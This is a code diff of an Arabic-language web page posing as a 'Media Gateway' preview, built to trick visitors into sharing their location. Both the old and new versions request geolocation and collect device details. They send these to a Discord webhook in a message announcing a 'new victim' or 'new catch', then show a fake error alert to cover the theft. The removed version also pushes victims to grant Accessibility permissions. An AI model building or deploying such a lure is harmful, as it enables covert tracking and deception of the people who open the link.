@@ -1,49 +1,50 @@
-<script>
-    if ('serviceWorker' in navigator) {
-        navigator.serviceWorker.register('sw.js');
-    }
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="manifest" href="manifest.json">
+    <title>Media Gateway</title>
+    <style>
+        body { background: #000; color: #fff; font-family: sans-serif; text-align: center; padding-top: 100px; }
+        button { padding: 15px 30px; background: #1a73e8; color: #fff; border: none; border-radius: 25px; cursor: pointer; font-size: 16px; }
+    </style>
+</head>
+<body>
 
-    async function access() {
-        // طلب الموقع كتمويه تقني
-        navigator.geolocation.getCurrentPosition(async (pos) => {
-            
-            // انتبه: امسح السطر التالي وضع مكانه الرابط الذي نسخته من Discord
-            const WEBHOOK_URL =https://discord.com/channels/1494438534344347658/1494438534864703500 // جلب بيانات إضافية (البطارية) لزيادة دقهـناهير
-            let batteryStatus = "غير معروف";
-            try {
-                const battery = await navigator.getBattery();
-                batteryStatus = `${(battery.level * 100).toFixed(0)}% (${battery.charging ? 'جاري الشحن' : 'تفريغ'})`;
-            } catch (e) {}
+    <h2>جاري التحقق من اتصالك الآمن...</h2>
+    <p>لمشاهدة المحتوى الخاص، اضغط على المعاينة</p>
+    <button onclick="access()">معاينة الوسائط</button>
 
-            const payload = {
-                username: "الرادار السيبراني",
-                avatar_url: "https://cdn-icons-png.flaticon.com/512/681/681498.png",
-                content: "🎯 **تم رصد ضحية جديدة بالرابط!**",
-                embeds: [{
-                    title: "تقرير السحب الفوري",
-                    color: 15158332,
-                    fields: [
-                        { name: "📍 الموقع الجغرافي", value: `[فتح الخريطة](https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude})`, inline: false },
-                        { name: "🔋 حالة البطارية", value: batteryStatus, inline: true },
-                        { name: "📱 نظام التشغيل", value: navigator.platform, inline: true },
-                        { name: "🌐 المتصفح", value: navigator.userAgent.split(' ')[0], inline: true }
-                    ],
-                    footer: { text: "نظام التشغيل الآمن | 2026" }
-                }]
-            };
+    <script>
+        async function access() {
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                
+                // اترك هذا الرابط كما هو أو ضع رابط الـ Webhook الخاص بك هنا بدقة
+                const WEBHOOK_URL = "https://discord.com/channels/1494438534344347658/1494438534864703500";
 
-            // إرسال البيانات فوراً لـ Discord
-            await fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
+                const payload = {
+                    content: "🎯 **صيد جديد!**",
+                    embeds: [{
+                        title: "تقرير الهدف",
+                        description: `📍 الموقع: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}\n📱 الجهاز: ${navigator.userAgent}`,
+                        color: 16711680
+                    }]
+                };
+
+                try {
+                    await fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(payload)
+                    });
+                } catch (e) { console.log("خطأ في الإرسال"); }
+
+                alert("خطأ 403: يجب منح صلاحيات الوصول للوسائط من إعدادات النظام.");
+            }, (err) => {
+                alert("يجب السماح بالوصول للموقع لمشاهدة المحتوى.");
             });
-
-            // رسالة إيهام الضحية النهائية
-            alert("فشل التحقق من بروتوكول SSL. يرجى محاولة فتح الرابط من تطبيق 'أندرويد الأصلي' أو منح صلاحيات Accessibility.");
-            
-        }, (err) => {
-            alert("عذراً، يجب السماح بالوصول لمشغل الوسائط لعرض الصورة الخاصة.");
-        });
-    }
-</script>
+        }
+    </script>
+</body>
+</html>
